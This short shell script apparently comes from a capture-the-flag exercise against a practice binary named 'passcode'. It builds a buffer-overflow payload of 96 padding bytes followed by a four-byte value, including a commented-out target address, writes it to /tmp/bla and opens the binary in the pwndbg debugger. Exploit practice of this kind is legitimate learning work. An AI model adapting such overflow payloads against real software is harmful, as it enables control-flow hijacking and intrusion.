#!/bin/sh

#python -c "print( 'a' * 96 + '\x14\xc0\x04\x08' )" > /tmp/bla
python -c "print( 'a' * 96 + 'ABCD' )" > /tmp/bla
pwndbg passcode 
